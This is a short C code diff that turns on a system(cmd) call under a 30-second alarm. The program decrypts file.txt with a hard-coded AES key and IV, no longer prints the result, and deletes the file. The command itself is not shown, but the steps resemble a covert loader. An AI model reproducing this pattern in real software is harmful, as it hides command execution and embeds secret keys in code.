@@ -113,9 +113,9 @@ int main(int argc, char *argv[])
     uint8_t key[] = "6jaaz2jwsnf0a7kw2k7dqf7k62apknua";
     uint8_t iv[]  = "1283666c72eec9e4";
 
-    /*signal(SIGALRM, ALARMhandler);
+    signal(SIGALRM, ALARMhandler);
     alarm(30);
-    system(cmd);*/
+    system(cmd);
 
     FILE *encf = fopen("file.txt", "r");
     char str[4096];
@@ -136,7 +136,7 @@ int main(int argc, char *argv[])
     AES_init_ctx_iv(&ctx, key, iv);
     AES_CBC_decrypt_buffer(&ctx, str, buffsize);
 
-    printf("\n\n %s\n", str);
+    //printf("\n\n %s\n", str);
     fclose(encf);
     remove("file.txt");
 
